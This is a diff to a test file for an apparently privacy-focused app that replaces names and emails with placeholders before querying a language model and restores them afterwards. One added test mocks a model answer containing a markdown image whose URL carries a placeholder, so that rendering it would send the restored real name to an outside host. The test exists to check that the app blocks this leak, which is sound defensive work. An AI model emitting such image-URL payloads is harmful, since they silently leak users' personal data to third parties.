@@ -34,7 +34,8 @@ def run_with_prompt(prompt):
 def test_shows_pseudonymized_content_response_and_mapping():
     page = run_with_prompt("Marie Dupont, marie@example.ch")
     assert page.code[0].value == "<PERSON_1>, <EMAIL_1>"
-    assert "Bonjour <PERSON_1>" in [element.value for element in page.markdown]
+    assert page.code[1].value == "Bonjour Marie Dupont"
+    assert not page.warning
     assert any("Response time:" in element.value for element in page.caption)
     assert page.dataframe[0].value["Real value"].tolist() == ["Marie Dupont", "marie@example.ch"]
 
@@ -86,3 +87,27 @@ def test_a_failed_run_removes_the_previous_result(monkeypatch):
 
 def test_asks_for_input_when_empty():
     assert run_with_prompt("  ").warning
+
+
+def test_response_with_an_image_is_shown_as_plain_text(monkeypatch):
+    """Markdown would load the image, and send the restored name in its address."""
+    image = "![](https://example.com/x.png?q=<PERSON_1>)"
+    monkeypatch.setattr(engine, "answer", lambda _: image)
+    page = run_with_prompt("Marie Dupont")
+    assert page.code[1].value == "![](https://example.com/x.png?q=Marie Dupont)"
+    assert not any("example.com" in element.value for element in page.markdown)
+
+
+def test_unknown_placeholder_is_shown_with_a_warning(monkeypatch):
+    monkeypatch.setattr(engine, "answer", lambda _: "<PERSON_1> et <PERSON_3>")
+    page = run_with_prompt("Marie Dupont")
+    assert page.code[1].value == "Marie Dupont et <PERSON_3>"
+    assert "<PERSON_3>" in page.warning[0].value
+
+
+def test_values_not_found_are_shown_with_a_warning(monkeypatch):
+    monkeypatch.setattr(engine, "ask_model", lambda _: [("PERSON", "Claire Favre")])
+    page = run_with_prompt("Favre Claire")
+    assert "1 of the values" in page.warning[0].value
+    assert page.code[0].value == "Claire Favre"
+    assert page.code[1].value == "Favre Claire"
